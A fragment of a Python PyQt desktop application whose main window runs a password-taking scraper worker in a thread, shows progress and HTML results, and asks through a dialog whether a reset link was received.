        self.worker = ScraperWorker(password)
        self.worker.moveToThread(self.thread)

        self.worker.log_signal.connect(self.append_log)
        self.worker.progress_update_signal.connect(self.update_progress_bar)
        self.worker.initial_setup_completed_signal.connect(
            self.initial_setup_done_slot
        )
        self.worker.full_process_completed_signal.connect(
            self.full_process_finished_slot
        )
        self.worker.intermediate_result_signal.connect(self.insert_html)

        self.worker.ask_retry_signal.connect(self.ask_for_retry)

        self.thread.started.connect(self.worker.run)
        self.thread.start()

    @QtCore.pyqtSlot(int, str)
    def update_progress_bar(self, value, text):
        self.progress_bar.setValue(value)
        self.progress_bar.setFormat(f"%p% - {text}")

    @QtCore.pyqtSlot(str)
    def initial_setup_done_slot(self, result_html):
        cursor = self.text_edit.textCursor()
        cursor.movePosition(QtGui.QTextCursor.MoveOperation.End)
        cursor.insertHtml(result_html)

    @QtCore.pyqtSlot(str)
    def full_process_finished_slot(self, result_html):
        cursor = self.text_edit.textCursor()
        cursor.movePosition(QtGui.QTextCursor.MoveOperation.End)
        cursor.insertHtml(result_html)
        self.scrape_button.setEnabled(True)
        if self.thread and self.thread.isRunning():
            self.thread.quit()
            self.thread.wait()
        self.thread = None
        self.worker = None
        self.progress_bar.setValue(100)
        self.progress_bar.setFormat("100% - Done!")

    @QtCore.pyqtSlot()
    def ask_for_retry(self):
        self.append_log(
            "Bot: Did you receive the reset link? Waiting for your response..."
        )
        reply = QtWidgets.QMessageBox.question(
            self,
            "Reset Link Received?",
            "Did you receive the reset link?",
            QtWidgets.QMessageBox.StandardButton.Yes
            | QtWidgets.QMessageBox.StandardButton.No,
            QtWidgets.QMessageBox.StandardButton.Yes,
        )

        if reply == QtWidgets.QMessageBox.StandardButton.Yes:
            self.append_log("User: Yes, I received the reset link.")
            if self.worker:
                self.worker.retry_decision_signal.emit(True)
        else:
            self.append_log("User: No, let's do it again.")
            if self.worker:
                self.worker.retry_decision_signal.emit(False)

    def append_log(self, message):
        self.text_edit.append(message)

    @QtCore.pyqtSlot(str)
    def insert_html(self, html):
        cursor = self.text_edit.textCursor()
        cursor.movePosition(QtGui.QTextCursor.MoveOperation.End)
        cursor.insertHtml(html)
        cursor.insertBlock()


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)

    font_hash = hashlib.sha256("Segoe UI".encode()).hexdigest()
    font = QtGui.QFont("Segoe UI", 10)
    app.setFont(font)

    startup_processing = CPUIntensiveProcessor.mathematical_operations(99999)
    window = MainWindow()
    window.show()

    app.exec()